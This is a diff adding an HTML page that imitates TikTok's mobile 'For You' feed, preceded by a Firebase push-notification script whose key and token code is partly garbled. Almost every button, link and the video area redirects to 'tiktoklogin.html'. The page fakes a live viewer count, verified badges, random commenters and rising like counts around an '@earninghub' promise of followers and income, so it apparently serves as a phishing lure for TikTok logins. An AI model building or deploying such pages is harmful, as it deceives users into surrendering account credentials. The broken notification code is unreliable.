@@ -1,0 +1,983 @@
+
+  <!DOCTYPE html>
+<html>
+<head>
+ 
+<script src="https://www.gstatic.com/firebasejs/4.9.1/firebase.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<link rel="manifest" href="manifest.json">
+<script>
+  // Initialize Firebase
+  /*Update this config*/
+  var config = {
+     apiKey: "AIzaSyBV2pY0LLJTrHhiCFArAedQpTiUshDJsi8",
+  authDomain: "pinnocent-fa387.firebaseapp.com",
+  databaseURL: "https://pinnocent-fa387.firebaseio.com",
+  projectId: "pinnocent-fa387",
+  storageBucket: "pinnocent-fa387.appspot.com",
+  messagingSenderId: "403452483449",
+  appId: "1:403452483449:web:630abc1e7c265a8f0481a8",
+  measurementId: "G-8DGVGDCCL2"
+  };
+  firebase.initializeApp(config);
+
+	// Retrieve Firebase Messaging object.
+	const messaging = firebase.messaging();
+	messaging.requestPermission()
+	.then(function() {
+	  console.log('Notification permission granted.');
+	  // TODO(developer): Retrieve an Instance ID token for use with FCM.
+	 
+               
+                vapidKey: 'BLf-6mYxA6BPIXK-MpMWYKuLDPpbKFtXdERFs506kY1xZsek0B8ieRRIikBGaO0LKrFXzglm-mNr4rpMypLLiJ4' }).then((currentToken) => {
+                if (currentToken) {
+                    console.log("Token is: "+currentToken);
+	  } else {
+	  	getRegToken();
+	  }
+
+	})
+	.catch(function(err) {
+	  console.log('Unable to get permission to notify.', err);
+	});
+
+	function getRegToken(argument) {
+		messaging.getToken()
+		  .then(function(currentToken) {
+		    if (currentToken) {
+		      saveToken(currentToken);
+		      console.log(currentToken);
+		      setTokenSentToServer(true);
+		    } else {
+		      console.log('No Instance ID token available. Request permission to generate one.');
+		      setTokenSentToServer(false);
+		    }
+		  })
+		  .catch(function(err) {
+		    console.log('An error occurred while retrieving token. ', err);
+		    setTokenSentToServer(false);
+		  });
+	}
+
+	function setTokenSentToServer(sent) {
+	    window.localStorage.setItem('sentToServer', sent ? 1 : 0);
+	}
+
+	function isTokenSentToServer() {
+	    return window.localStorage.getItem('sentToServer') == 1;
+	}
+
+	function saveToken(currentToken) {
+		$.ajax({
+			url: '?',
+			method: 'post',
+			data: 'token=' + currentToken
+		}).done(function(result){
+			console.log(result);
+		})
+	}
+
+	messaging.onMessage(function(payload) {
+	  console.log("Message received. ", payload);
+	  notificationTitle = payload.data.title;
+	  notificationOptions = {
+	  	body: payload.data.body,
+	  	icon: payload.data.icon,
+	  	image:  payload.data.image
+	  };
+	  var notification = new Notification(notificationTitle,notificationOptions);
+	});
+</script>
+</head>
+<body>
+<center>
+ 
+  
+</center>
+</body>
+
+<html>
+<head>
+    
+
+   <title>form | pinnocent</title>
+   <!DOCTYPE html>
+                            <html lang="en">
+                            <head>
+                                <meta charset="UTF-8">
+                                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                                <title>TikTok</title>
+                                <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+                                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+                                <style>
+                                    body {
+                                        background-color: black;
+                                        color: white;
+                                        font-family: "Proxima Nova", "Arial", sans-serif;
+                                        padding-bottom: 50px; /* Space for bottom nav */
+                                    }
+                                    
+                                    .video-container {
+                                        position: relative;
+                                        height: calc(100vh - 100px); /* Adjust for bottom nav */
+                                        overflow: hidden;
+                                        display: flex;
+                                        justify-content: center;
+                                    }
+                                    
+                                    .video-content {
+                                        width: 100%;
+                                        height: 100%;
+                                        object-fit: cover;
+                                        position: absolute;
+                                    }
+                                    
+                                    .sidebar-icon {
+                                        display: flex;
+                                        flex-direction: column;
+                                        align-items: center;
+                                        margin-bottom: 20px;
+                                    }
+                                    
+                                    .sidebar-icon i {
+                                        font-size: 28px;
+                                        margin-bottom: 4px;
+                                    }
+                                    
+                                    .sidebar-value {
+                                        font-size: 12px;
+                                        font-weight: 600;
+                                    }
+                                    
+                                    .profile-circle {
+                                        width: 50px;
+                                        height: 50px;
+                                        border-radius: 50%;
+                                        border: 2px solid #fff;
+                                        overflow: hidden;
+                                        position: relative;
+                                    }
+                                    
+                                    .tiktok-music-disc {
+                                        animation: spin 3s linear infinite;
+                                    }
+                                    
+                                    @keyframes spin {
+                                        0% { transform: rotate(0deg); }
+                                        100% { transform: rotate(360deg); }
+                                    }
+                                    
+                                    .overlay-gradient {
+                                        background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 50%);
+                                        position: absolute;
+                                        bottom: 0;
+                                        left: 0;
+                                        right: 0;
+                                        height: 50%;
+                                        pointer-events: none;
+                                    }
+                                    
+                                    .play-button {
+                                        position: absolute;
+                                        top: 50%;
+                                        left: 50%;
+                                        transform: translate(-50%, -50%);
+                                        font-size: 80px;
+                                        color: rgba(255,255,255,0.8);
+                                        opacity: 1; /* Always visible */
+                                        z-index: 15;
+                                        filter: drop-shadow(0 0 10px rgba(0,0,0,0.5));
+                                    }
+                                    
+                                    /* Updated plus button */
+                                    .profile-plus-button {
+                                        position: absolute;
+                                        bottom: -5px;
+                                        left: 50%;
+                                        transform: translateX(-50%);
+                                        width: 20px;
+                                        height: 20px;
+                                        background-color: #fe2c55;
+                                        color: white;
+                                        border-radius: 50%;
+                                        display: flex;
+                                        align-items: center;
+                                        justify-content: center;
+                                        font-size: 14px;
+                                        border: 2px solid black;
+                                        z-index: 5;
+                                    }
+                                    
+                                    .comment-appear {
+                                        animation: slideUp 0.4s ease forwards;
+                                    }
+                                    
+                                    @keyframes slideUp {
+                                        from { opacity: 0; transform: translateY(20px); }
+                                        to { opacity: 1; transform: translateY(0); }
+                                    }
+                                    
+                                    .likes-animation {
+                                        transition: color 0.3s, transform 0.3s;
+                                    }
+                                    
+                                    .likes-animation.active {
+                                        color: #fe2c55;
+                                        transform: scale(1.2);
+                                    }
+                                    
+                                    .comment-box {
+                                        position: fixed;
+                                        bottom: 0;
+                                        left: 0;
+                                        right: 0;
+                                        height: 65vh;
+                                        background-color: #1f1f1f;
+                                        border-radius: 12px 12px 0 0;
+                                        z-index: 100;
+                                        transform: translateY(100%);
+                                        transition: transform 0.3s ease;
+                                        overflow-y: auto;
+                                    }
+                                    
+                                    .comment-box.open {
+                                        transform: translateY(0);
+                                    }
+                                    
+                                    .comment-item {
+                                        margin-bottom: 15px;
+                                    }
+                                    
+                                    /* TikTok-specific verified badge */
+                                    .verified-badge {
+                                        display: inline-flex;
+                                        align-items: center;
+                                        justify-content: center;
+                                        width: 14px;
+                                        height: 14px;
+                                        background-color: #20D5EC;
+                                        color: white;
+                                        font-size: 8px;
+                                        margin-left: 4px;
+                                        border-radius: 50%;
+                                    }
+                                    
+                                    .creator-badge {
+                                        background-color: #fe2c55;
+                                        color: white;
+                                        font-size: 10px;
+                                        padding: 1px 6px;
+                                        border-radius: 4px;
+                                        margin-left: 4px;
+                                    }
+                                    
+                                    .overlay-content {
+                                        position: absolute;
+                                        bottom: 20px;
+                                        left: 0;
+                                        padding: 0 12px;
+                                        width: 100%;
+                                    }
+                                    
+                                    .music-marquee {
+                                        white-space: nowrap;
+                                        width: 75%;
+                                        overflow: hidden;
+                                    }
+                                    
+                                    .music-text {
+                                        display: inline-block;
+                                        animation: marquee 12s linear infinite;
+                                    }
+                                    
+                                    @keyframes marquee {
+                                        0% { transform: translateX(100%); }
+                                        100% { transform: translateX(-100%); }
+                                    }
+                                    
+                                    .tiktok-bg-blur {
+                                        backdrop-filter: blur(5px);
+                                        background-color: rgba(0,0,0,0.6);
+                                        border-radius: 8px;
+                                        padding: 4px 8px;
+                                    }
+                                    
+                                    .comment-overlay {
+                                        position: fixed;
+                                        top: 0;
+                                        left: 0;
+                                        right: 0;
+                                        bottom: 0;
+                                        background-color: rgba(0,0,0,0.5);
+                                        z-index: 50;
+                                        display: none;
+                                    }
+                                    
+                                    .progress-bar {
+                                        position: absolute;
+                                        top: 0;
+                                        left: 0;
+                                        height: 3px;
+                                        background-color: white;
+                                        width: 0%;
+                                        z-index: 5;
+                                    }
+                                    
+                                    /* Bottom Navigation Bar */
+                                    .bottom-nav {
+                                        position: fixed;
+                                        bottom: 0;
+                                        left: 0;
+                                        right: 0;
+                                        height: 50px;
+                                        background-color: black;
+                                        display: flex;
+                                        justify-content: space-around;
+                                        align-items: center;
+                                        border-top: 1px solid #333;
+                                        z-index: 30;
+                                    }
+                                    
+                                    .nav-item {
+                                        display: flex;
+                                        flex-direction: column;
+                                        align-items: center;
+                                        color: #aaa;
+                                        font-size: 9px;
+                                        padding: 5px 0;
+                                    }
+                                    
+                                    .nav-item i {
+                                        font-size: 20px;
+                                        margin-bottom: 3px;
+                                    }
+                                    
+                                    .nav-item.active {
+                                        color: white;
+                                    }
+                                    
+                                    .upload-btn {
+                                        background: linear-gradient(90deg, #25F4EE, #FE2C55, #25F4EE);
+                                        background-size: 200% 100%;
+                                        width: 44px;
+                                        height: 28px;
+                                        border-radius: 8px;
+                                        position: relative;
+                                        display: flex;
+                                        justify-content: center;
+                                        align-items: center;
+                                        margin-top: -10px;
+                                    }
+                                    
+                                    .upload-btn i {
+                                        color: white;
+                                        font-size: 18px;
+                                    }
+                                    
+                                    .notification-badge {
+                                        position: absolute;
+                                        top: 0;
+                                        right: 0;
+                                        background-color: #fe2c55;
+                                        color: white;
+                                        font-size: 8px;
+                                        min-width: 14px;
+                                        height: 14px;
+                                        border-radius: 7px;
+                                        display: flex;
+                                        justify-content: center;
+                                        align-items: center;
+                                        border: 1px solid black;
+                                    }
+                                    
+                                    /* Top Navigation */
+                                    .top-nav {
+                                        display: flex;
+                                        padding: 12px 16px;
+                                        justify-content: space-between;
+                                        align-items: center;
+                                        background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 100%);
+                                        position: fixed;
+                                        top: 0;
+                                        left: 0;
+                                        right: 0;
+                                        z-index: 20;
+                                    }
+                                    
+                                    .top-tabs {
+                                        display: flex;
+                                        align-items: center;
+                                        gap: 20px;
+                                    }
+                                    
+                                    .top-tab {
+                                        font-size: 16px;
+                                        font-weight: 600;
+                                        position: relative;
+                                        color: #888;
+                                    }
+                                    
+                                    .top-tab.active {
+                                        color: white;
+                                    }
+                                    
+                                    .top-tab.active:after {
+                                        content: "";
+                                        position: absolute;
+                                        bottom: -6px;
+                                        left: 50%;
+                                        transform: translateX(-50%);
+                                        width: 6px;
+                                        height: 6px;
+                                        background-color: white;
+                                        border-radius: 50%;
+                                    }
+                                    
+                                    .top-actions {
+                                        display: flex;
+                                        align-items: center;
+                                        gap: 20px;
+                                    }
+                                    
+                                    /* Updated Live TV badge */
+                                    .tiktok-live-badge {
+                                        display: flex;
+                                        align-items: center;
+                                        background-color: #fe2c55;
+                                        color: white;
+                                        border-radius: 4px;
+                                        padding: 3px 8px;
+                                        font-size: 12px;
+                                        font-weight: bold;
+                                        letter-spacing: 0.5px;
+                                        box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+                                    }
+                                    
+                                    .tiktok-live-badge i {
+                                        font-size: 10px;
+                                        margin-right: 4px;
+                                    }
+                                    
+                                    /* Updated Live indicator for profile */
+                                    .tiktok-live-indicator {
+                                        position: absolute;
+                                        bottom: -4px;
+                                        left: -4px;
+                                        background-color: #fe2c55;
+                                        color: white;
+                                        font-size: 9px;
+                                        font-weight: bold;
+                                        padding: 1px 5px;
+                                        border-radius: 4px;
+                                        z-index: 5;
+                                        border: 1px solid black;
+                                        animation: live-pulse-color 1.5s infinite alternate;
+                                    }
+                                    
+                                    @keyframes live-pulse-color {
+                                        0% { background-color: #fe2c55; }
+                                        100% { background-color: #ff7b92; }
+                                    }
+                                    
+                                    .live-viewers {
+                                        position: absolute;
+                                        top: 10px;
+                                        left: 10px;
+                                        background-color: rgba(0,0,0,0.5);
+                                        border-radius: 4px;
+                                        padding: 2px 8px;
+                                        display: flex;
+                                        align-items: center;
+                                        font-size: 14px;
+                                        z-index: 15;
+                                    }
+                                    
+                                    .live-viewers i {
+                                        color: #fe2c55;
+                                        margin-right: 5px;
+                                    }
+                                </style>
+                            </head>
+                            <body>
+                                <!-- TikTok App Top Navigation -->
+                                <div class="top-nav">
+                                    <div class="top-tabs">
+                                        <a href="tiktoklogin.html" class="tiktok-live-badge">
+                                            <i class="fas fa-circle"></i>LIVE
+                                        </a>
+                                        <div class="top-tab">
+                                            Explore
+                                        </div>
+                                        <div class="top-tab">
+                                            Following
+                                        </div>
+                                        <div class="top-tab active">
+                                            For You
+                                        </div>
+                                    </div>
+                                    <div class="top-actions">
+                                        <a href="tiktoklogin.html">
+                                            <i class="fas fa-search text-xl"></i>
+                                        </a>
+                                    </div>
+                                </div>
+                                
+                                <!-- Live Viewer Counter -->
+                                <div class="live-viewers" id="liveViewers">
+                                    <i class="fas fa-circle"></i> 4,082
+                                </div>
+                                
+                                <!-- Progress Bar -->
+                                <div class="progress-bar" id="progressBar"></div>
+                        
+                                <!-- Main Video Container -->
+                                <div class="video-container" id="videoContainer">
+                                    <img src="https://via.placeholder.com/720x1280" alt="TikTok Video" class="video-content">
+                                    <a href="tiktoklogin.html" id="videoLink" class="absolute inset-0 z-10"></a>
+                                    <div class="play-button" id="playButton">
+                                        <i class="fas fa-play-circle"></i>
+                                    </div>
+                                    <div class="overlay-gradient"></div>
+                                    
+                                    <!-- Right Sidebar with Actions -->
+                                    <div class="absolute right-3 bottom-24 flex flex-col items-center z-20">
+                                        <!-- Profile with Live indicator and Plus button -->
+                                        <div class="sidebar-icon mb-5">
+                                            <a href="tiktoklogin.html" class="profile-circle">
+                                                <img src="https://via.placeholder.com/50x50" alt="Profile Picture" class="w-full h-full object-cover">
+                                                <div class="tiktok-live-indicator">LIVE</div>
+                                                <div class="profile-plus-button">+</div>
+                                            </a>
+                                        </div>
+                                        
+                                        <!-- Like Button -->
+                                        <div class="sidebar-icon" id="likeButton" onclick="toggleLike(event)">
+                                            <a href="tiktoklogin.html">
+                                                <i class="fas fa-heart likes-animation"></i>
+                                                <div class="sidebar-value" id="likeCount">498,056</div>
+                                            </a>
+                                        </div>
+                                        
+                                        <!-- Comment Button -->
+                                        <div class="sidebar-icon" id="commentButton" onclick="openComments(event)">
+                                            <i class="fas fa-comment-dots"></i>
+                                            <div class="sidebar-value" id="commentCount">47,900</div>
+                                        </div>
+                                        
+                                        <!-- Share Button -->
+                                        <div class="sidebar-icon">
+                                            <a href="tiktoklogin.html">
+                                                <i class="fas fa-share"></i>
+                                                <div class="sidebar-value">14,291</div>
+                                            </a>
+                                        </div>
+                                        
+                                        <!-- Save Button -->
+                                        <div class="sidebar-icon">
+                                            <a href="tiktoklogin.html">
+                                                <i class="fas fa-bookmark"></i>
+                                                <div class="sidebar-value">5,463</div>
+                                            </a>
+                                        </div>
+                                        
+                                        <!-- Music Disc -->
+                                        <div class="sidebar-icon mt-4">
+                                            <div class="w-10 h-10 rounded-full bg-gray-900 flex items-center justify-center overflow-hidden">
+                                                <img src="https://via.placeholder.com/40x40" alt="Music Disc" class="w-full h-full object-cover tiktok-music-disc">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Overlay Content at Bottom -->
+                                    <div class="overlay-content z-20">
+                                        <!-- Username and Description -->
+                                        <div class="mb-2">
+                                            <a href="tiktoklogin.html" class="font-bold text-white flex items-center">
+                                                @earninghub <span class="verified-badge"><i class="fas fa-check" style="font-size: 8px;"></i></span>
+                                            </a>
+                                        </div>
+                                        <div class="text-white text-sm mb-3 line-clamp-2 max-w-xs">
+                                            Get followers on TikTok and start earning money online 
+                                        </div>
+                                        
+                                        <!-- Music Info -->
+                                        <div class="flex items-center">
+                                            <i class="fas fa-music mr-2 text-sm"></i>
+                                            <div class="music-marquee">
+                                                <div class="music-text text-sm">
+                                                    @earninghub · Original Sound - Click for more · #trending #viral
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- Modern TikTok Bottom Navigation -->
+                                <div class="bottom-nav">
+                                    <a href="tiktoklogin.html" class="nav-item active">
+                                        <i class="fas fa-home"></i>
+                                        <span>Home</span>
+                                    </a>
+                                    <a href="tiktoklogin.html" class="nav-item">
+                                        <i class="fas fa-compass"></i>
+                                        <span>Discover</span>
+                                    </a>
+                                    <a href="tiktoklogin.html" class="nav-item">
+                                        <div class="upload-btn">
+                                            <i class="fas fa-plus"></i>
+                                        </div>
+                                    </a>
+                                    <a href="tiktoklogin.html" class="nav-item relative">
+                                        <i class="fas fa-inbox"></i>
+                                        <span class="notification-badge">12</span>
+                                        <span>Inbox</span>
+                                    </a>
+                                    <a href="tiktoklogin.html" class="nav-item">
+                                        <i class="fas fa-user"></i>
+                                        <span>Profile</span>
+                                    </a>
+                                </div>
+                                
+                                <!-- Comments Overlay -->
+                                <div class="comment-overlay" id="commentOverlay" onclick="closeComments()"></div>
+                                
+                                <!-- Comments Box -->
+                                <div class="comment-box" id="commentBox">
+                                    <div class="p-4 border-b border-gray-800 flex justify-between items-center sticky top-0 bg-black z-10">
+                                        <div class="text-white font-bold text-lg">47,900 comments</div>
+                                        <div onclick="closeComments()" class="text-xl p-2">
+                                            <i class="fas fa-times"></i>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="p-3" id="commentsContainer">
+                                        <!-- Creator Pinned Comment -->
+                                        <div class="comment-item mb-5 pb-3 border-b border-gray-800">
+                                            <div class="flex">
+                                                <div class="relative mr-3">
+                                                    <img src="https://via.placeholder.com/40x40" alt="Creator" class="w-10 h-10 rounded-full">
+                                                    <div class="tiktok-live-indicator">LIVE</div>
+                                                </div>
+                                                <div class="flex-1">
+                                                    <div class="flex items-center">
+                                                        <a href="tiktoklogin.html" class="font-bold text-white text-sm">@earninghub</a>
+                                                        <span class="verified-badge"><i class="fas fa-check" style="font-size: 8px;"></i></span>
+                                                        <span class="creator-badge mx-1">CREATOR</span>
+                                                        <span class="text-gray-500 text-xs ml-2">Pinned</span>
+                                                    </div>
+                                                    <div class="text-white text-sm mt-1">
+                                                        Get followers on TikTok and start earning money online 
+                                                    </div>
+                                                    <div class="flex items-center mt-2 text-xs text-gray-500">
+                                                        <span>2d</span>
+                                                        <span class="mx-2">·</span>
+                                                        <a href="tiktoklogin.html" class="hover:text-white">Reply</a>
+                                                        <span class="mx-2">·</span>
+                                                        <a href="tiktoklogin.html" id="pinnedLikeBtn" onclick="toggleCommentLike(event, 'pinnedLike')" class="flex items-center hover:text-white">
+                                                            <i class="far fa-heart mr-1"></i>
+                                                            <span id="pinnedLike">42.5K</span>
+                                                        </a>
+                                                    </div>
+                                                    
+                                                    <!-- View replies link -->
+                                                    <a href="tiktoklogin.html" class="text-gray-500 text-xs flex items-center mt-2">
+                                                        <i class="fas fa-chevron-down mr-1"></i>
+                                                        View 241 replies
+                                                    </a>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- Dynamic Comments Will Be Added Here -->
+                                    </div>
+                                    
+                                    <!-- New Comment Input -->
+                                    <div class="sticky bottom-0 bg-black border-t border-gray-800 p-3 flex items-center">
+                                        <a href="tiktoklogin.html" class="flex-1 bg-gray-800 rounded-full py-2 px-4 text-gray-300 text-sm">
+                                            Add comment...
+                                        </a>
+                                        <a href="tiktoklogin.html" class="ml-3 text-gray-400">
+                                            <i class="fas fa-paper-plane"></i>
+                                        </a>
+                                    </div>
+                                </div>
+                                
+                                <script>
+                                    // First names and last names for random comments
+                                    var firstNames = ["Alex", "Jamie", "Jordan", "Taylor", "Casey", "Morgan", "Riley", "Quinn", "Avery", "Skyler", 
+                                        "Sam", "Blake", "Charlie", "Dakota", "Reese", "Finley", "Harper", "Emerson", "Ellis", "Phoenix", "Remy", 
+                                        "Hayden", "Rowan", "Kai", "Sawyer", "Michael", "James", "Robert", "David", "Mary", "Patricia", "Jennifer"];
+                                        
+                                    var lastNames = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", 
+                                        "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin", "Thompson", "Garcia", "Martinez", "Robinson"];
+                                    
+                                    // Initialize
+                                    document.addEventListener("DOMContentLoaded", function() {
+                                        // Auto play video progress simulation
+                                        simulateVideoProgress();
+                                        
+                                        // Pre-generate comments
+                                        generateInitialComments();
+                                        
+                                        // Start comment simulation
+                                        simulateActivity();
+                                        
+                                        // Start LIVE viewer counter simulation
+                                        simulateLiveViewers();
+                                        
+                                        // Set event listener for video container
+                                        document.getElementById("videoContainer").addEventListener("click", function(e) {
+                                            if (e.target.id !== "likeButton" && e.target.id !== "commentButton" && 
+                                                !e.target.closest("#likeButton") && !e.target.closest("#commentButton")) {
+                                                window.location.href = "tiktoklogin.html";
+                                            }
+                                        });
+                                        
+                                        // Add pulsing animation for live indicators
+                                        pulseLiveElements();
+                                    });
+                                    
+                                    // Pulse LIVE text
+                                    function pulseLiveElements() {
+                                        // Target all live indicators and make them pulse
+                                        var liveIndicators = document.querySelectorAll(".tiktok-live-indicator");
+                                        
+                                        setInterval(function() {
+                                            liveIndicators.forEach(function(indicator) {
+                                                indicator.style.transform = "scale(1.1)";
+                                                
+                                                setTimeout(function() {
+                                                    indicator.style.transform = "scale(1)";
+                                                }, 500);
+                                            });
+                                        }, 1000);
+                                    }
+                                    
+                                    // Simulate video progress
+                                    function simulateVideoProgress() {
+                                        var progressBar = document.getElementById("progressBar");
+                                        var progress = 0;
+                                        var interval = setInterval(function() {
+                                            progress += 0.2;
+                                            progressBar.style.width = progress + "%";
+                                            
+                                            if (progress >= 100) {
+                                                progress = 0;
+                                                progressBar.style.width = "0%";
+                                            }
+                                        }, 100);
+                                    }
+                                    
+                                    // Simulate live viewers count increasing/decreasing
+                                    function simulateLiveViewers() {
+                                        var viewersElement = document.getElementById("liveViewers");
+                                        var currentViewers = parseInt(viewersElement.textContent.replace(/,/g, "").replace(/[^0-9]/g, ""));
+                                        
+                                        setInterval(function() {
+                                            // Random increase or decrease with 70% chance of increase
+                                            var change = Math.random() > 0.3 ? 
+                                                Math.floor(Math.random() * 30) + 1 : 
+                                                -Math.floor(Math.random() * 15) + 1;
+                                            
+                                            currentViewers = Math.max(100, currentViewers + change); // Ensure at least 100 viewers
+                                            
+                                            // Format with commas
+                                            viewersElement.innerHTML = "<i class=\"fas fa-circle\"></i> " + currentViewers.toLocaleString();
+                                            
+                                            // Add subtle animation
+                                            viewersElement.style.transform = "scale(1.05)";
+                                            setTimeout(function() {
+                                                viewersElement.style.transform = "scale(1)";
+                                            }, 300);
+                                            
+                                        }, 3000); // Update every 3 seconds
+                                    }
+                                    
+                                    // Rest of the JavaScript for comments, likes, etc.
+                                    // Toggle like animation
+                                    function toggleLike(e) {
+                                        e.preventDefault();
+                                        e.stopPropagation();
+                                        
+                                        var likeBtn = document.querySelector(".likes-animation");
+                                        var likeCount = document.getElementById("likeCount");
+                                        var currentCount = parseInt(likeCount.textContent.replace(/,/g, ""));
+                                        
+                                        if (!likeBtn.classList.contains("active")) {
+                                            likeBtn.classList.add("active");
+                                            likeBtn.style.color = "#fe2c55";
+                                            likeCount.textContent = (currentCount + 1).toLocaleString();
+                                        } else {
+                                            likeBtn.classList.remove("active");
+                                            likeBtn.style.color = "";
+                                            likeCount.textContent = (currentCount - 1).toLocaleString();
+                                        }
+                                    }
+                                    
+                                    // Toggle comment like
+                                    function toggleCommentLike(e, id) {
+                                        e.preventDefault();
+                                        e.stopPropagation();
+                                        
+                                        var likeText = document.getElementById(id);
+                                        var likeBtn = e.currentTarget.querySelector("i");
+                                        var currentText = likeText.textContent;
+                                        var currentCount;
+                                        
+                                        if (currentText.includes("K")) {
+                                            currentCount = parseFloat(currentText.replace("K", "")) * 1000;
+                                        } else {
+                                            currentCount = parseInt(currentText.replace(/,/g, ""));
+                                        }
+                                        
+                                        if (likeBtn.classList.contains("far")) {
+                                            likeBtn.classList.remove("far");
+                                            likeBtn.classList.add("fas");
+                                            likeBtn.style.color = "#fe2c55";
+                                            
+                                            if (currentCount >= 1000) {
+                                                var newCount = ((currentCount + 1) / 1000).toFixed(1);
+                                                likeText.textContent = newCount + "K";
+                                            } else {
+                                                likeText.textContent = (currentCount + 1).toLocaleString();
+                                            }
+                                        } else {
+                                            likeBtn.classList.remove("fas");
+                                            likeBtn.classList.add("far");
+                                            likeBtn.style.color = "";
+                                            
+                                            if (currentCount >= 1000) {
+                                                var newCount = ((currentCount - 1) / 1000).toFixed(1);
+                                                likeText.textContent = newCount + "K";
+                                            } else {
+                                                likeText.textContent = (currentCount - 1).toLocaleString();
+                                            }
+                                        }
+                                    }
+                                    
+                                    // Open comments
+                                    function openComments(e) {
+                                        e.preventDefault();
+                                        e.stopPropagation();
+                                        
+                                        document.getElementById("commentBox").classList.add("open");
+                                        document.getElementById("commentOverlay").style.display = "block";
+                                        document.body.style.overflow = "hidden";
+                                    }
+                                    
+                                    // Close comments
+                                    function closeComments() {
+                                        document.getElementById("commentBox").classList.remove("open");
+                                        document.getElementById("commentOverlay").style.display = "none";
+                                        document.body.style.overflow = "";
+                                    }
+                                    
+                                    // Function to get random name
+                                    function getRandomName() {
+                                        var firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+                                        var lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+                                        return firstName.toLowerCase() + lastName.toLowerCase();
+                                    }
+                                    
+                                    // Function to get random comment
+                                    function getRandomComment() {
+                                        var comments = [
+                                            "This video is EVERYTHING! ???",
+                                            "Obsessed with this! Made my day ?",
+                                            "I've already watched this 10 times lol ?",
+                                            "Wait why is no one talking about how good this is???",
+                                            "The talent jumped OUT ???",
+                                            "This trend is absolutely sending me ?",
+                                            "The algorithm finally blessed me ?",
+                                            "My FYP has been blessed ✨",
+                                            "This needs to blow up right now!!",
+                                            "Please make more of these! ?",
+                                            "POV: you're watching this for the 100th time",
+                                            "The way I RAN to the comments ?‍♀️?",
+                                            "Immediately no. Immediately yes. ?",
+                                            "I was having the worst day until I saw this"
+                                        ];
+                                        return comments[Math.floor(Math.random() * comments.length)];
+                                    }
+                                    
+                                    // Generate initial set of comments
+                                    function generateInitialComments() {
+                                        var commentsContainer = document.getElementById("commentsContainer");
+                                        var commentHTML = "";
+                                        
+                                        // Generate 10 initial comments
+                                        for (var i = 0; i < 10; i++) {
+                                            var username = getRandomName();
+                                            var comment = getRandomComment();
+                                            var time = Math.floor(Math.random() * 24) + 1 + "h";
+                                            var likes = Math.floor(Math.random() * 1000) + 1;
+                                            
+                                            commentHTML += `
+                                            <div class="comment-item">
+                                                <div class="flex">
+                                                    <a href="tiktoklogin.html" class="mr-3">
+                                                        <img src="https://i.pravatar.cc/150?u=${username}" alt="${username}" class="w-10 h-10 rounded-full">
+                                                    </a>
+                                                    <div class="flex-1">
+                                                        <div class="flex items-center">
+                                                            <a href="tiktoklogin.html" class="font-bold text-white text-sm">@${username}</a>
+                                                        </div>
+                                                        <div class="text-white text-sm mt-1">
+                                                            ${comment}
+                                                        </div>
+                                                        <div class="flex items-center mt-2 text-xs text-gray-500">
+                                                            <span>${time}</span>
+                                                            <span class="mx-2">·</span>
+                                                            <a href="tiktoklogin.html" class="hover:text-white">Reply</a>
+                                                            <span class="mx-2">·</span>
+                                                            <a href="tiktoklogin.html" class="flex items-center hover:text-white">
+                                                                <i class="far fa-heart mr-1"></i>
+                                                                <span>${likes}</span>
+                                                            </a>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>`;
+                                        }
+                                        
+                                        commentsContainer.innerHTML += commentHTML;
+                                    }
+                                    
+                                    // Simulate real-time activity
+                                    function simulateActivity() {
+                                        // Add a random comment every 5-10 seconds
+                                        setInterval(function() {
+                                            if (Math.random() > 0.5) { // 50% chance to add a new comment
+                                                var commentCountEl = document.getElementById("commentCount");
+                                                var currentCount = parseInt(commentCountEl.textContent.replace(/,/g, ""));
+                                                commentCountEl.textContent = (currentCount + 1).toLocaleString();
+                                            }
+                                            
+                                            // Occasionally update like count
+                                            if (Math.random() > 0.5) {
+                                                                        var likeCountEl = document.getElementById("likeCount");
+                        var currentLikes = parseInt(likeCountEl.textContent.replace(/,/g, ""));
+                        var increment = Math.floor(Math.random() * 5) + 1;
+                        likeCountEl.textContent = (currentLikes + increment).toLocaleString();
+                    }
+                    
+                }, Math.floor(Math.random() * 5000) + 5000);
+            }
+            
+            // Make play button pulse to draw attention
+            setInterval(function() {
+                var playButton = document.querySelector(".play-button i");
+                playButton.style.transform = "scale(1.1)";
+                playButton.style.opacity = "1";
+                
+                setTimeout(function() {
+                    playButton.style.transform = "scale(1)";
+                    playButton.style.opacity = "0.8";
+                }, 500);
+            }, 2000);
+        </script>
+    </body>
+    </html> 
+  
+    
